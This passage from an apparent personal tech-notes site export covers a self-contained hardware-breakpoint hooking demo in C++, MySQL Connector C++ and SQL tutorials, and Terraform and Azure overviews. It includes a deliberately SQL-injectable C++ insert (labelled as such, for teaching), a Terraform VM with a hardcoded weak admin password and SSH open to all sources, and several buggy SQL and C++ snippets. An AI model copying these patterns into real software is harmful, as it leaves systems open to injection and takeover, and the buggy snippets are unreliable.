ERROR_SUCCESS)\n    {\n        printf(&quot;PssCaptureSnapshot failed...&quot;);\n    }\n \n    std::shared_ptr&lt;HPSSWALK&gt; walker(new HPSSWALK{}, [&amp;](HPSSWALK* walkerPtr) { PssWalkMarkerFree(*walkerPtr); });\n \n    if (PssWalkMarkerCreate(nullptr, walker.get()) != ERROR_SUCCESS)\n    {\n        printf(&quot;PssWalkMarkerCreate failed...&quot;);\n    }\n \n    DWORD main_thread_id{};\n    FILETIME lowest_create_time{ MAXDWORD, MAXDWORD };\n \n    PSS_THREAD_ENTRY thread{};\n \n    while (PssWalkSnapshot(*snapshot, PSS_WALK_THREADS,\n        *walker, &amp;thread, sizeof(thread)) == ERROR_SUCCESS) {\n        if (CompareFileTime(&amp;lowest_create_time, &amp;thread.CreateTime) == 1) {\n            lowest_create_time = thread.CreateTime;\n            main_thread_id = thread.ThreadId;\n        }\n    }\n \n    return main_thread_id;\n}\n \nbool set_debug_breakpoint(const HANDLE&amp; main_thread_handle, const void* const target_addr)\n{\n    CONTEXT context{\n        .ContextFlags = CONTEXT_DEBUG_REGISTERS,\n        .Dr0 = (DWORD)target_addr,\n        .Dr7 = (1 &lt;&lt; 0)\n    };\n \n    if (!SetThreadContext(main_thread_handle, &amp;context)) {\n        printf(&quot;SetThreadContext failed...\\n&quot;);\n        return false;\n    }\n \n    ResumeThread(main_thread_handle);\n \n    return true;\n}\n \nvoid __fastcall display_message(const std::string&amp; message)\n{\n    printf(&quot;%s\\n&quot;, message.c_str());\n}\n \nint main()\n{\n    DWORD main_thead_id = get_main_thead_id(GetCurrentProcess());\n    HANDLE main_thread_handle = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, false, main_thead_id);\n    AddVectoredExceptionHandler(true, exception_handler);\n    set_debug_breakpoint(main_thread_handle, display_message);\n    CloseHandle(main_thread_handle);\n    display_message(&quot;Hello World&quot;);\n    return 0;\n}\nWhat is happening inside of the code? As explained previously, each time the display_messsage() function is called the message &quot;Hooked&quot; will be displayed instead of the message inside of the parameter. Hardware Breakpoint Hooking is a difficult topic to understand therefore I highly recommend playing around with it."},"Documents/0003-MySQL-Connector-CPP":{"slug":"Documents/0003-MySQL-Connector-CPP","filePath":"Documents/0003 MySQL Connector CPP.md","title":"MySQL Connector C++","links":[],"tags":[],"content":"Introduction\nMySQL Connector C++ contains the source code, libraries (.lib), and dynamic link libraries (.dll) which are necessary to create a connection with MySQL server using C++. Once the connection is established you can execute commands to create, update, and delete databases, tables, and records within the tables.\nMySQL Connector for MacOS\nInstalling MySQL Connector C++ on MacOS:\nbrew install mysql-connector-c++\nCompiling with G++ using MysQL Connector C++:\ng++ -std=c++17 -o main main.cpp -I &quot;/opt/homebrew/Cellar/mysql-connector-c++/8.3.0/include&quot; -L &quot;/opt/homebrew/Cellar/mysql-connector-c++/8.3.0/lib -lmysqlcppconn8&quot;\nMySQL Connector for Windows\nInstalling MySQL Connector C++ on Windows: MySQL C++ Connector Download\nSetting up MYSQL Connector C++ for Visual Studio 2022:\n\nAdditional Include Directories = C:\\MySQL\\MySQL Connector C++ 8.4\\include\nAdditional Library = C:\\MySQL\\MySQL Connector C++ 8.4\\lib64\\vs14\nAdditional Dependencies = libssl.lib;libcrypto.lib;mysqlcppconn-static.lib;\n\nBasics of MySQL Connector C++\nYou will need to include the jdbc.hheader header since it will import all the headers that are necessary to establish a connection with MySQL server and to create, update, remove, and execute on MySQL server.\n#include &lt;mysql/jdbc.h&gt;\nTo establish a connection with MySQL server, the objects sql::Driverand and sql::Connection are needed as these two objects works together to establish the connection to MySQL server.\n#include &lt;mysql/jdbc.h&gt;\n \nint main() {\n    // SQL Objects\n    sql::Driver* driver;\n    sql::Connection* con;\n \n    // Preparing driver object\n    driver = get_driver_instance();\n \n    // Connecting to the database\n    con = driver-&gt;connect(&quot;[IP-ADDR]&quot;, &quot;[USERNAME]&quot;, &quot;[PASSWORD]&quot;);\n \n    // Exiting the application\n    return 0;\n}\nOnce the connection has been successfully established, the sql::Statement object can be used to execute updates to MySQL database.\n#include &lt;mysql/jdbc.h&gt;\n \nint main() {\n    // SQL Objects\n    sql::Driver* driver;\n    sql::Connection* con;\n    sql::Statement* stmt;\n \n    // Preparing driver object\n    driver = get_driver_instance();\n \n    // Connecting to the database\n    con = driver-&gt;connect(&quot;[IP-ADDR]&quot;, &quot;[USERNAME]&quot;, &quot;[PASSWORD]&quot;);\n \n    // Setting up statement\n    stmt = con-&gt;createStatement();\n \n    // Creating a database named `test_db`\n    stmt-&gt;executeUpdate(&quot;CREATE DATABASE IF NOT EXISTS test_db;&quot;);\n \n    // Selecting the database\n    stmt-&gt;executeUpdate(&quot;USE test_db;&quot;);\n \n    // Creating users table\n    stmt-&gt;executeUpdate(&quot;CREATE TABLE IF NOT EXISTS users(FirstName varchar(255), LastName varchar(255));&quot;);\n \n    // Exiting the application\n    return 0;\n}\nMySQL Connector C++ also comes with prepared statements sql::PreparedStatement to avoid SQL injection vulnerabilities. It’s important to use prepared statements when user input is being injected onto queries since these can be modified to return values from other databases and tables.\nSQL Injection Vulnerable\n#include &lt;mysql/jdbc.h&gt;\n \nint main() {\n    // SQL Objects\n    sql::Driver* driver;\n    sql::Connection* con;\n    sql::Statement* stmt;\n \n    // Preparing driver object\n    driver = get_driver_instance();\n \n    // Connecting to the database\n    con = driver-&gt;connect(&quot;[IP-ADDR]&quot;, &quot;[USERNAME]&quot;, &quot;[PASSWORD]&quot;);\n \n    // Setting up statement\n    stmt = con-&gt;createStatement();\n \n    // Selecting the database\n    stmt-&gt;executeUpdate(&quot;USE test_db;&quot;);\n \n    // Creating users table\n    stmt-&gt;executeUpdate(&quot;CREATE TABLE IF NOT EXISTS users(FirstName varchar(255), LastName varchar(255));&quot;);\n \n    // String variables\n    std::string sql_query, fname, lname;\n \n    // User input for firstname\n    std::cout &lt;&lt; &quot;Firstname: &quot;;\n    std::cin &gt;&gt; fname;\n \n    // User input for lastname\n    std::cout &lt;&lt; &quot;Lastname: &quot;;\n    std::cin &gt;&gt; lname;\n \n    // SQL Injection Vulnerable\n    sql_query = &quot;INSERT INTO users(FirstName, LastName) VALUES (&#039;&quot; + fname + &quot;&#039;,&quot; + lname + &quot;&#039;);&quot;;\n \n    // Executes the `sql_query`\n    stmt-&gt;executeQuery(sql_query);\n \n    // Exiting the application\n    return 0;\n}\nMySQL Prepared Statements:\n#include &lt;mysql/jdbc.h&gt;\n \nint main() {\n    // SQL Objects\n    sql::Driver* driver;\n    sql::Connection* con;\n    sql::Statement* stmt;\n    sql::PreparedStatement* pre_stmt;\n \n    // Preparing driver object\n    driver = get_driver_instance();\n \n    // Connecting to the database\n    con = driver-&gt;connect(&quot;[IP-ADDR]&quot;, &quot;[USERNAME]&quot;, &quot;[PASSWORD]&quot;);\n \n    // Setting up statement\n    stmt = con-&gt;createStatement();\n \n    // Selecting the database\n    stmt-&gt;executeUpdate(&quot;USE test_db;&quot;);\n \n    // Creating users table\n    stmt-&gt;executeUpdate(&quot;CREATE TABLE IF NOT EXISTS users(FirstName varchar(255), LastName varchar(255));&quot;);\n \n    // String variables\n    std::string sql_query, fname, lname;\n \n    // User input for firstname\n    std::cout &lt;&lt; &quot;Firstname: &quot;;\n    std::cin &gt;&gt; fname;\n \n    // User input for lastname\n    std::cout &lt;&lt; &quot;Lastname: &quot;;\n    std::cin &gt;&gt; lname;\n \n    // Preparing MySQL Prepared Statement to avoid SQL injection\n    pre_stmt = con-&gt;prepareStatement(&quot;INSERT INTO users(FirstName, LastName) VALUES (?,?);&quot;);\n \n    // FirstName is assigned fname\n    pre_stmt-&gt;setString(1, fname);\n \n    // LastName is assigned lname\n    pre_stmt-&gt;setString(2, lname);\n \n    // Executing prepared statement\n    pre_stmt-&gt;execute();\n \n    // Exiting the application\n    return 0;\n}\nYou can also use MySQL Connector C++ to return queries from the MySQL server using sql::ResultSet.\nint main() {\n    // SQL Objects\n    sql::Driver* driver;\n    sql::Connection* con;\n    sql::ResultSet* res;\n \n    // Preparing driver object\n    driver = get_driver_instance();\n \n    // Connecting to the database\n    con = driver-&gt;connect(&quot;[IP-ADDR]&quot;, &quot;[USERNAME]&quot;, &quot;[PASSWORD]&quot;);\n \n    // Setting up statement\n    stmt = con-&gt;createStatement();\n \n    // Selecting the database\n    stmt-&gt;executeUpdate(&quot;USE test_db;&quot;);\n \n    // Executing query\n    res = stmt-&gt;executeQuery(&quot;SELECT FirstName, LastName FROM users;&quot;);\n \n    // Printign FirstName and LastName from `users` table \n    while (res-&gt;next()) {\n        std::cout &lt;&lt; &quot;Firstname: &quot; &lt;&lt; res-&gt;getString(1) &lt;&lt; std::endl;\n        std::cout &lt;&lt; &quot;Lastname: &quot; &lt;&lt; res-&gt;getString(2) &lt;&lt; &quot;\\n&quot; &lt;&lt; std::endl;\n    }\n \n    // Exiting the application\n    return 0;\n}\nConclusion\nMySQL Connector C++ comes with all the necessary features that are needed to create, update, execute, and delete databases, tables, and records on MySQL server. It also comes with security features such as prepared statement to avoid SQL injection on our MySQL server. With the correct implementation and best practices the MySQL Connector C++ can be a fantastic tool to build applications."},"Documents/0004-The-Basics-Of-MySQL":{"slug":"Documents/0004-The-Basics-Of-MySQL","filePath":"Documents/0004 The Basics Of MySQL.md","title":"The Basics Of SQL","links":[],"tags":[],"content":"Introduction\nSQL is the standard language for managing databases and the records inside of the databases. It’s widely used by organizations to manage and automate database setups, table setups, and inserting data into the tables. The data inside of the databases are commonly used for authentication, authorization, and showing specific data from the database to the website or the application.\nWhat is Database, Tables, and Records?\n    Databases                 Tables                         Colums\n+--------------+           +----------+           +----+----------+----------+\n| husenjanprod | --------&gt; | users    | --------&gt; | id | username | password |\n+--------------+           +----------+           +----+----------+----------+\n| husenjanpdev |           | settings |           | 1  | olav     | hashed   |\n+--------------+           +----------+           +----+----------+----------+\n       |                   | gifts    |           | 2  | johndoe  | hashed   |\n       |                   +----------+           +----+----------+----------+\n       |                      Tables                        Columns\n\t   |                   +----------+           +----+----------+----------+\n       +-----------------&gt; | users    | --------&gt; | id | username | password | \n                           +----------+           +----+----------+----------+\n                           | settings |           | 1  | testusr  | hashed   |\n                           +----------+           +----+----------+----------+\n                           | gifts    |\n\t\t\t\t\t\t   +----------+\nA single database is used for one specific thing, this can be for production or our test environment. Inside a database there are tables which are used to organize the data by users, groups, and gifits. An example of this is the databases husenjanprod and husenjandev one is used for production and the other one is used for our test environment. Note that it’s also possible to create relationships between a column from a table with another column from a different table (This is called for SQL Relationship).\nWorking with SQL\nIn this section of the document, I’ll go through the different SQL commands which are useful to know while working with a database. I highly recommend studying the commands and memorizing it as it will become useful when you need to work with an database.\nTo see all the databases:\nSHOW DATABASES;\nTo crease an database:\nCREATE DATABASE IF NOT EXISTS mydb;\nTo select an database:\nUSE mydb;\nTo list all our tables inside the database:\nSHOW TABLES;\nTo create an table with numbers and characters:\nCREATE TABLE IF NOT EXISTS users(\n\tid int PRIMARY KEY, -- Integer Column\n\tfirstname varchar(255), -- Character Column\n\tlastname varchar(255) -- Character Column\n);\nTo insert data inside the table created:\nINSERT INTO users(id, firstname, lastname) values (1, &#039;Husen123&#039;, &#039;Hesenjan123&#039;);\nTo change the data inside of the table:\nUPDATE users firstname = &#039;Husenjan&#039;, lastname = &#039;Hesenjan&#039; WHERE id = 1;\nThe commands shown might seem complicated for that reason I highly recommend playing around with it in an lab environment to better understand SQL before you continue reading the document.\nSQL Relationships\n                                                    +-----------------------------+\n    Databases                 Tables                |         Colums              |\n+--------------+           +----------+           +-*--+----------+----------+    |\n| husenjanprod | --------&gt; | users    | --------&gt; | id | username | password |    |\n+--------------+           +----------+           +----+----------+----------+    |\n| husenjanpdev |           | settings |           | 1  | husenjan | secret   |    | Interconnected\n+--------------+           +----------+           +----+----------+----------+    |\n                           | gifts    | ----+     | 2  | testusr  | secret   |    |\n                           +----------+     |     +----+----------+----------+    |\n\t\t\t\t\t\t                    |                                     |\n                                            |                +--------------------+\n                                            |                |\n                                            |     +----+-----*---+-----------+\n                                            +---&gt; | id | user_id | gift      |\n                                                  +----+---------+-----------+\n                                                  | 1  | 1       | iPhone 16 |\n                                                  +----+---------+-----------+\nSQL Relationships are used for linking two columns from different tables to each other, this allows us to see which item belogs to a specific user or a object. An example is connecting id column from users table to user_id column inside the gifts table. You can use the following SQL commands to create a SQL Relation-ship shown:\nCREATE TABLE IF NOT EXISTS users(\n\tid int PRIMARY KEY,\n\tusername varchar(255),\n\tpassword varchar(255) \n);\n \nCREATE TABLE IF NOT EXISTS gifts(\n\tid int PRIMARY KEY,\n\tuser_id int,\n\tgift varchar(2555),\n\tFOREIGN KEY (user_id) REFERENCES users(id)\n);\n \nINSERT INTO users(id, username, password) values (1, &#039;Husenjan&#039;, &#039;secret&#039;);\n \nINSERT INTO gifts(id, user_id, gift) values (1, 1, &#039;Husenjan&#039;, &#039;iPhone 16&#039;);\nNote that a SQL Relationship can only be created with columns that are defined PRIMARY KEY or UNIQUE otherwise the database will throw an error message. It’s also possible for us to create One-To-One Relationships, Many-To-Many Relationships, and Many-To-Many Relationships. When two columns are referenced to each other the following command can be used to query results from different tables:\nSELECT users.id, users.username, gifts.gift FROM users INNER JOIN gifts ON users.id = gifts.user_id;\nCreating SQL Scripts\nWe can also create an SQL Script by creating a tutorial.sql file which contains all our SQL commands and once it’s executed all the commands inside the file will be automatically executed for us.\ntutorial.sqlDROP IF EXISTS users;\nDROP IF EXISTS gifts;\n \nCREATE TABLE IF NOT EXISTS users(\n\tid int PRIMARY KEY,\n\tusername varchar(255),\n\tpassword varchar(255) \n);\n \nCREATE TABLE IF NOT EXISTS gifts(\n\tid int PRIMARY KEY,\n\tuser_id int,\n\tgift varchar(2555),\n\tFOREIGN KEY (user_id) REFERENCES users(id)\n);\n \nINSERT INTO users(id, username, password) values (1, &#039;Husenjan&#039;, &#039;secret&#039;);\n \nINSERT INTO gifts(id, user_id, gift) values (1, 1, &#039;Husenjan&#039;, &#039;iPhone 16&#039;);\nWhat is happening inside the script? The users and gifts table is deleted each execution and re-created again with the original records.\nConclusion\nUnderstanding SQL can be difficult in the beginning. However, the more you practice it the better you will become at it and it’s important to become familiar with it as a-lot organizations uses SQL is some way. And if you’re interested in becoming a developer, software engineer, or security researcher it’s important to be familiar with it as you will deal with it a lot."},"Documents/0005-Terraform-for-Microsoft-Azure":{"slug":"Documents/0005-Terraform-for-Microsoft-Azure","filePath":"Documents/0005 Terraform for Microsoft Azure.md","title":"Terraform for Microsoft Azure","links":[],"tags":[],"content":"Introduction\nI’m currently working on a personal project which requires me to use Terraform. I decided to create this document to potentially help other people out with their journey with learning Terraform since it can be a complex topic to learn.\nWhat is Terraform?\nTerraform is widely used by organizations to create Infrastructure as Code (IaC) as it allows you to build, change, and managa your cloud infrastructure in safe, consistent, and repeatable way. Terraform also supports many different cloud providers such as Amazon Cloud, Google Cloud, DigitalOceans and much more.\nMicrosoft Azure CLI\nTerraform requires us to install Microsoft Azure CLI on our local machine before we can start working with it. We can install Microsoft Azure CLI using the following command on Windows:\n# Install Microsoft Azure CLI \nwinget install -e --id Microsoft.AzureCLI\nWe will need to login to our Microsoft Azure account and select the subscription which we want to work on:\n# Login to Microsoft Azure\naz login\n \n# Shows all available subscriptions in our Tenant \naz account list\n \n# To choose a specific subscription\naz account set --subscription=&quot;SUBSCRIPTION_ID&quot;\nWhen all these steps has been completed we can now start coding our cloud environment using terraform. It’s important to note that without Microsoft Azure CLI we won’t be able to deploy the resources for our cloud environment.\nTerraform Code\nWe will need to initalize our work folder with terraform before we can start coding with it. To initialize the work folder with terraform use the following command:\nterraform init\nWe can now create a provider.tf file and include the following configuration:\n/terraform/provider.tfterraform {\n    required_providers {\n        azurerm = {\n            source = &quot;hashicorp/azurerm&quot;\n            version = &quot;~&gt; 4.0&quot;\n        }\n    }\n}\n \nprovider &quot;azurerm&quot; {\n    features{}\n    subscription_id = &quot;000000000-0000-4abe-995f-73851a2822d6&quot;\n    resource_provider_registrations = &quot;none&quot;\n}\nInside subscription_id field you will need to put your own subscription identification otherwise terraform will throw an message. Now we can create a main.tf file where all our cloud resources will be defined for our cloud environment:\n/terraform/main.tf# Creates a resource group\nresource &quot;azurerm_resource_group&quot; &quot;rg-terraform&quot; {\n    name = &quot;rg-terraform&quot;\n    location = &quot;west europe&quot;\n}\n \n# Creates a virtual network \nresource &quot;azurerm_virtual_network&quot; &quot;weu-vnet&quot; {\n    name = &quot;weu-vnet&quot;\n    resource_group_name = azurerm_resource_group.rg-terraform.name\n    location = azurerm_resource_group.rg-terraform.location\n    address_space = [ &quot;10.0.0.0/16&quot; ]\n}\n \n# Creates a subnet inside virtual network\nresource &quot;azurerm_subnet&quot; &quot;weu-vnet-external-subnet&quot; {\n    name = &quot;weu-vnet-external-subnet&quot;\n    resource_group_name = azurerm_resource_group.rg-terraform.name\n    virtual_network_name = azurerm_virtual_network.weu-vnet.name\n    address_prefixes = [&quot;10.0.1.0/24&quot;]\n}\nAll the terraform code does is creating a resource group, virtual network, and a subnet inside the vitual network. We can deploy these resources using the following commands:\n# Shows us the changes that will be done to our environment \nterraform plan \n \n# Deploys the cloud resources to our cloud environment \nterraform apply\n \n# Deletes all cloud resources that terraform deployed\nterraform destroy \nNote that terraform destroy will completely delete all the resources which were created and any changes done to them with click ups will be deleted. What is fantastic about terraform is the ability to quickly deploy and destroy the cloud resources instead of potentially messing it up doing it manually.\nTerraform Advanced Code\nIn this section of the document I’ll go through the following concept:\n\nCreating resource group\nCreating virtual network\nCreating subnet mask\nCreating virtual machine\nCreating security group\n\nIt can be a bit difficult for beginners to understand the code below therefore I highly recommend googling the things which you’re unfamiliar with.\n/terraform/variables.tfvariable &quot;default-resource-group&quot; {\n  type        = string\n  description = &quot;Default resource group&quot;\n  default     = &quot;rg-terraform&quot;\n}\n \nvariable &quot;default-resource-location&quot; {\n  type        = string\n  description = &quot;Default location for resource group and resources&quot;\n  default     = &quot;West Europe&quot;\n}\n/terraform/main.tfresource &quot;azurerm_resource_group&quot; &quot;rg-terraform&quot; {\n  name     = var.default-resource-group\n  location = var.default-resource-location\n}\n \nresource &quot;azurerm_virtual_network&quot; &quot;weu-vnet&quot; {\n  name                = &quot;weu-vnet&quot;\n  resource_group_name = var.default-resource-group\n  location            = var.default-resource-location\n  address_space       = [&quot;10.0.0.0/16&quot;]\n}\n \nresource &quot;azurerm_subnet&quot; &quot;weu-vnet-external-subnet&quot; {\n  name                 = &quot;weu-vnet-external-subnet&quot;\n  resource_group_name  = var.default-resource-group\n  virtual_network_name = azurerm_virtual_network.weu-vnet.name\n  address_prefixes     = [&quot;10.0.1.0/24&quot;]\n}\n \nresource &quot;azurerm_network_security_group&quot; &quot;weu-vnet-sgroup&quot; {\n  name                = &quot;weu-vnet-sgroup&quot;\n  resource_group_name = var.default-resource-group\n  location            = var.default-resource-location\n \n  security_rule {\n    name                       = &quot;SSH&quot;\n    priority                   = 150\n    direction                  = &quot;Inbound&quot;\n    access                     = &quot;Allow&quot;\n    protocol                   = &quot;Tcp&quot;\n    source_port_range          = &quot;*&quot;\n    destination_port_range     = &quot;22&quot;\n    source_address_prefix      = &quot;*&quot;\n    destination_address_prefix = &quot;*&quot;\n  }\n}\n \nresource &quot;azurerm_public_ip&quot; &quot;weu-vm1-ip&quot; {\n  name                = &quot;weu-vm1-ip&quot;\n  location            = var.default-resource-location\n  resource_group_name = var.default-resource-group\n  allocation_method   = &quot;Static&quot;\n}\n \nresource &quot;azurerm_network_interface&quot; &quot;weu-vm1-ni1&quot; {\n  name                = &quot;weu-vm1-ni1&quot;\n  resource_group_name = var.default-resource-group\n  location            = var.default-resource-location\n \n  ip_configuration {\n    name                          = &quot;weu-vm1-ip&quot;\n    subnet_id                     = azurerm_subnet.weu-vnet-external-subnet.id\n    private_ip_address_allocation = &quot;Dynamic&quot;\n    public_ip_address_id          = azurerm_public_ip.weu-vm1-ip.id\n  }\n}\n \nresource &quot;azurerm_network_interface_security_group_association&quot; &quot;weu-vm1-ni1-sgroup&quot; {\n  network_interface_id      = azurerm_network_interface.weu-vm1-ni1.id\n  network_security_group_id = azurerm_network_security_group.weu-vnet-sgroup.id\n}\n \nresource &quot;azurerm_linux_virtual_machine&quot; &quot;weu-vm1&quot; {\n  name                  = &quot;weu-vm1&quot;\n  resource_group_name   = var.default-resource-group\n  location              = var.default-resource-location\n  network_interface_ids = [azurerm_network_interface.weu-vm1-ni1.id]\n  size                  = &quot;Standard_DS1_v2&quot;\n \n  os_disk {\n    name                 = &quot;weu-vm1-os-disk&quot;\n    caching              = &quot;ReadWrite&quot;\n    storage_account_type = &quot;Premium_LRS&quot;\n  }\n \n  source_image_reference {\n    publisher = &quot;Canonical&quot;\n    offer     = &quot;0001-com-ubuntu-server-jammy&quot;\n    sku       = &quot;22_04-lts-gen2&quot;\n    version   = &quot;latest&quot;\n  }\n \n  computer_name                   = &quot;weu-vm1&quot;\n  admin_username                  = &quot;secure-admin&quot;\n  admin_password                  = &quot;password123!&quot;\n  disable_password_authentication = false\n}\n/terraform/output.tfoutput &quot;azurerm_public_ip&quot; {\n    value = &quot;${azurerm_public_ip.weu-vm1-ip.*.ip_address}&quot;\n}\nAll the terraform code does is creating a resource group, virtual network, network security group, an virtual machine which is connected to the virtual network with a public ip-address assigned to it. Once all the cloud resources are deployed the public ip-address of the virtual machine is printed to our terminal.\nConclusion\nSuprisingly, Terraform is a game-changer for engineers that works with deploying cloud resources as it allows us to quickly deploy and destroy our cloud resources and if something goes wrong with our environ-ment we can quickly roll back to the old version instead of having business down-time."},"Documents/0006-The-Microsoft-Azure-Documentation":{"slug":"Documents/0006-The-Microsoft-Azure-Documentation","filePath":"Documents/0006 The Microsoft Azure Documentation.md","title":"The Microsoft Azure Documentation","links":[],"tags":[],"content":"Why Should I Use Cloud Services?\nIt can be difficult for organization’s to justify the reasoning for moving to the cloud because of the cost associated to it. However, there are many benefits with moving to the cloud as it can help with reducing costs and increasing Recovery Time Objective (RTO) and Recovery Point Objective (RPO).\nAn example of reducing cost is when an organization purchases hardware the hardware is tax deducted over a period of years. However, when we are using a cloud provider such as Microsoft Azure the costs can be tax deductable within the same year since it’s a operational costs. In addition, the hardware is main-tained and replaced by Microsoft which can help with reducing costs.\nIt’s important to note that Microsoft Azure can help with reducing costs but it can also lead to increased costs if the architects and engineers doesn’t follow the best practices.\nInfrastructure as Code\nNowadays, most organization’s uses Infrastructure as Code (IaaC) to create their cloud environment as that enables them to:\n\nQuickly create new cloud environment\nQuickly destroy the cloud environment\nFull overview of the cloud environment with version control\n\nIt’s recommended to use Azure Biceps, Azure ARM Templates, or Terraform to create your cloud environ-ment. However, most organization’s prefers Terraform as it’s integrated with Azure, AWS, Digital Oceans, and multiple of other cloud providers.\nAzure Best Practices\nAzure comes with many capabilities to organize our cloud resources since it can quickly become complex to manage our cloud resources. Here are some best practices to follow which are recommended by Microsoft:\n\nAzure Resource Tag: It’s recommended to always take advantage of Azure Resource Tag as it can help with finding who’s owner of the cloud resource and which department is responsible for it.\nAzure Resource Lock: It’s highly recommended to use Resource Lock as it prevents cloud resources from accidentally being deleted by a contributor\nAzure Policy: You must take advantage of Azure Policy as it enables us to enforce users to use specific tags before they are allowed to create the resource\n\nIf Azure Resource Tag and Azure Resource Lock is not adapted in the early stages it can quickly become complex to manage the cloud environment and that can lead to increased costs.\nAzure Migration\nIf your organization is migrating from on-premises to Microsoft Azure it’s recommended to take a closer look at the following tools developed by Microsoft:\n\nAzure Migrate: Assists us with migrating on-premises virtual machines to Microsoft Azure\nAzure Data Box: Assists us with uploading on-premises data to Microsoft Azure\n\nAzure Migrate can be connected with vSphere to scan for on-premises virtual machines and also provide us a cost estimation for the migration. Azure Data Box is a box organization’s can order to upload their data to Azure instead of transferring terabytes of data through the internet.\nAzure Virtual Network\nAzure Virtual Network is our networking environment in the cloud and it enables us to do the following:\n\nPeer multiple of virtual networks together\nChoose a subnet mask\nChoose a address space\n\nWe can also attach Azure Network Security Group to the virtual network, subnet mask, and virtual machines and that allows us to do the following:\n\nAllow/Block communication on specific port\nAllow/Block communication from a specific IP-address\n\nIt’s only recommended to use Azure Network Security Group on virtual network and subnet mask level because if an issue occurs troubleshooting it will be much easier. It’s recommended by Microsoft to use a Hub &amp; Spoke Virtual Network setup to secure our cloud resources:\n\nHub Virtual Network: Contains Azure Firewall, Azure Bastion, and VPN Gateway\nSpoke Virtual Network: Contains Virtual Machines and other cloud resources which requires a virtual network\n\nWe should always take advantage of Hub &amp; Spoke Virtual Network as it will ensure all traffic that goes in and out the network is secure and non malicious.\nAzure Firewall\nAzure Firewall comes with many capabilities to protect our cloud resources from malicious threat actors. It also allows us to configure the firewall to accept or decline specific traffic and ports. Azure Firewall also comes with three different SKUs:\n\nDefault SKU: Supports only 2 virtual machines and provides alert on malicious threat actors pattern\nStandard SKU: Provides protection against malicious threat actors from known malicious IP-addresses and domains\nPremium SKU: Provides capabilities such as signature based IDPS and rapid detection by looking at specific pattern\n\nWe should only use Premium SKUs depending on the risk tolerance of the organization as some are willing to risk more to reduce costs and others are willing to spend more to reduce risk. As architects and engin-eers our responsibility is to comply with the risks the management has accepted.\nAzure Web Application Firewall\nAzure Web Application Firewall (WAF) provides a centralized protection for web application from common exploits and vulnerabilities. It can help with protecting our website from server-side template injection, cross-stie scripting, path traversal, and SQL injection attacks and much more.\n\n\n                  \n                  Note\n                  \n                \n\n\nAzure Web Application Firewall can also protect cloud resources such as  Azure Application Gateway and Azure Front Door.\n\n\n\nAzure Application Gateway &amp; Azure Load Balancer\nflowchart LR;\n\t1(Azure Application Gateway)\n\t2(VM 1)\n\t3(VM 2)\n\t4(Load Balancer)\n\t5(VM 1)\n\t6(VM 2)\n\t\n\t1 --&gt; 2\n\t1 --&gt; 3\n\t2 --&gt; 4\n\t3 --&gt; 4\n\t4 --&gt; 5\n\t4 --&gt; 6 \n\nAzure Application Gateway is recommended for balancing HTTP traffic between multiple of virtual machines as it comes with advanced routing and more security capabilities. However, Azure Load Balancer is recommended for distributing TCP and UDP traffic between multiple of virtual machines.\nAzure Virtual Machine\nAzure Virtual Machines are as any virtual machines that we could create in an VMWare vSphere, it also comes with capabilities to deploy custom ISO files in-case we need to move our legacy virtual machines to Microsoft Azure.\nAzure also enables us to take advantage of Azure Availability Zones incases of disaster since each Azure Availability Zone has distinct power source, network, and cooling. Another Azure feature which we can also take advantage of Azure Virtual Machine Scale Set to deploy more virtual machines when the demand is high and automatically decrease it when the demand is low.\nWe can also use Azure Availability Sets to increase the up-time for our virtual machines. Here is a overview of Azure Availability Sets:\nflowchart TB;\n\tsubgraph MySubGraph1[&quot;Fault Domain 2&quot;]\n\t\tsubgraph MySubGraphInheritance1[&quot;Update Domain 1&quot;]\n\t\t\t3(RDPS03)\n\t\t\t4(RDPS04)\n\t\tend\n\tend\n\tsubgraph MySubGraph2[&quot;Fault Domain 1&quot;]\n\t\tsubgraph MySubGraph Inheritance2[&quot;Update Domain 2&quot;]\n\t\t\t1(RDPS01)\n\t\t\t2(RDPS02)\n\tend\nend\n\n\nUpdate Domain: A group of virtual machines which are rebooted at the same time when doing an update\nFault Domain: A group of update domains where the traffic is forwarded when one fault domain is under maintenance\n\nWhen Fault Domain 1 goes down because of a disaster than the traffic is forwarded to Fault Domain 2. It’s important to note that it’s possible to have more than two fault domains.\n\n\n                  \n                  Important\n                  \n                \n\n\nWe can also reduce the costs of the Azure Virtual Machines by taking advantage of Azure Hybrid Benefits and Azure Reservation.\n\n\n\nAzure Bastion\n\tflowchart LR\n\tUser(User)\n\tPortal(Azure Portal)\n\tBastion(Azure Bastion)\n\tVM(Virtual Machine)\n\tUser -- &quot;TLS&quot; --&gt; Portal \n\tPortal -- &quot;Internet (Port 443)&quot; --&gt; Bastion\n\n    subgraph ide2 [Hub Virutal Network]\n\t\tBastion\n\tend\n\t\n\tsubgraph ide1 [Spoke Virtual Network]\n\t\tBastion -- &quot;RDP (Port 3389)&quot; --&gt; VM\n    end\n\tstyle User fill:#b8f218,stroke:#333,stroke-width:1px\n\nAzure Bastion is a great solution for connecting to virtual machines without going through the public internet. It allows us to access all the virtual machines inside our virtual network and virtual networks which are peered together.\nAzure Site Recovery\nAzure Site Recovery replicates all our Azure Resources from one region to another in-case a disaster occurs with our primary region.   According to Microsoft; Azure Site Recovery has a RTO SLA for one hour to replicate our environment to a different region.\nAzure Front Door\nAzure Front Door is a Content Delivery Network that delivers our static web application faster and more reliably. It will automatically forward the user to the closest server. If an region fails than the traffic is automatically forwarded to the closest available server.\nAzure Batch\nAzure Batch is commonly used for HPC purposes as it allows us to manage nodes, install application to nodes, and schedule jobs on the nodes. A node is a virtual machine that Azure Batch manages.\nAzure Container\nAzure Container is a small and lightweight operating system which is commonly used for developing applications. It enables us to quickly share our code with clients and other developers without troubleshooting the host operating system.\nAzure Containers are fantastic for running simple applications which doesn’t require complex networking front-end or back-end.\nAzure Kubernetes\nAzure Kubernetes comes with the same capabilities as Kubernetes since it allows us to do the following:\n\nStarting new containers when necessary\nRestarting containers when they crash\nSpreading out the work to different containers\nScaling up and down depending on demand\n\nIt also enables us to create complex networking environment with front-end network, back-end network, and internal network.\nAzure Storage\nAzure Storage comes with many different capabilities and options to store our data’s.\n\nAzure Blobs: Recommended for storing texts, videos, and audio files\nAzure Files: Recommended for creating a File-Share where users can upload/download from\nAzure Queues: Recommended for storing large amount of text messages\nAzure Tables: Recommended for applications that are using NoSQL\n\nAzure also provides us the option to store our files in different tiers.\n\nHot Tier: Recommended for data which is accessed frequently\nCool Tier: Recommended for data that will stay for longer than 30 days\nCold Tier: Recommended for data that will stay for longer than 90 days\nArchive Tier: Recommended for data that will stay for loner than 180 days\n\nMicrosoft has implemented the following tools to enable us to work with the different storage 